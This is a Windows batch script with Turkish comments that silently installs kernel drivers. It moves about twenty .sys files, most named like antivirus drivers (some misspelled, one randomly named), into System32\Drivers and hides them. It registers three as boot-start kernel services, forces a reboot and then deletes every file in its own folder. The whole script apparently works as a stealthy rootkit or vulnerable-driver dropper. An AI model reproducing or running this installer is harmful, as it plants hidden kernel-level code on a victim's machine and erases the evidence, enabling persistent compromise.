@echo off

set "system32Dir=C:\Windows\System32\Drivers"

:: Belirtilen sürücü dosyalarını taşı ve servis oluştur (başlatma yok)
if exist "%~dp0awsSnx64.sys" (
    move /y "%~dp0awsSnx64.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\awsSnx64.sys"
    sc create awsSnx64 type= kernel start= boot binpath= "%system32Dir%\awsSnx64.sys"
)

if exist "%~dp0aswbidsdriver64.sys" (
    move /y "%~dp0aswbidsdriver64.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswbidsdriver64.sys"
    sc create aswbidsdriver64 type= kernel start= boot binpath= "%system32Dir%\aswbidsdriver64.sys"
)

if exist "%~dp0aswArDisk64.sys" (
    move /y "%~dp0aswArDisk64.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswArDisk64.sys"
    sc create aswArDisk64 type= kernel start= boot binpath= "%system32Dir%\aswArDisk64.sys"
)

:: Diğer sürücü dosyalarını sadece taşı
if exist "%~dp0awsSP64.sys" (
    move /y "%~dp0awsSP64.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\awsSP64.sys"
)

if exist "%~dp0aswNetHub.sys" (
    move /y "%~dp0aswNetHub.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswNetHub.sys"
)

if exist "%~dp0aswRdr2.sys" (
    move /y "%~dp0aswRdr2.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswRdr2.sys"
)

if exist "%~dp0aswRvrt.sys" (
    move /y "%~dp0aswRvrt.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswRvrt.sys"
)

if exist "%~dp0aswSnx.sys" (
    move /y "%~dp0aswSnx.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswSnx.sys"
)

if exist "%~dp0aswSP.sys" (
    move /y "%~dp0aswSP.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswSP.sys"
)

if exist "%~dp0aswStm.sys" (
    move /y "%~dp0aswStm.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswStm.sys"
)

if exist "%~dp0aswVmm.sys" (
    move /y "%~dp0aswVmm.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswVmm.sys"
)

if exist "%~dp0ySrU9QwDq7wjoDzd.sys" (
    move /y "%~dp0ySrU9QwDq7wjoDzd.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\ySrU9QwDq7wjoDzd.sys"
)

if exist "%~dp0aswMonFlt.sys" (
    move /y "%~dp0aswMonFlt.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswMonFlt.sys"
)

if exist "%~dp0aswKbd.sys" (
    move /y "%~dp0aswKbd.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswKbd.sys"
)

if exist "%~dp0aswElam.sys" (
    move /y "%~dp0aswElam.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswElam.sys"
)

if exist "%~dp0aswbuniv.sys" (
    move /y "%~dp0aswbuniv.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswbuniv.sys"
)

if exist "%~dp0aswbidsh.sys" (
    move /y "%~dp0aswbidsh.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswbidsh.sys"
)

if exist "%~dp0aswbidsdriver.sys" (
    move /y "%~dp0aswbidsdriver.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswbidsdriver.sys"
)

if exist "%~dp0aswArPot.sys" (
    move /y "%~dp0aswArPot.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswArPot.sys"
)

if exist "%~dp0aswArDisk.sys" (
    move /y "%~dp0aswArDisk.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswArDisk.sys"
)

:: Sistemi 10 saniye sonra yeniden başlat
C:\Windows\system32\cmd.exe /c shutdown /r /t 10

:: Betiğin bulunduğu klasördeki tüm dosyaları sil
del /q /f "%~dp0*.*"

exit
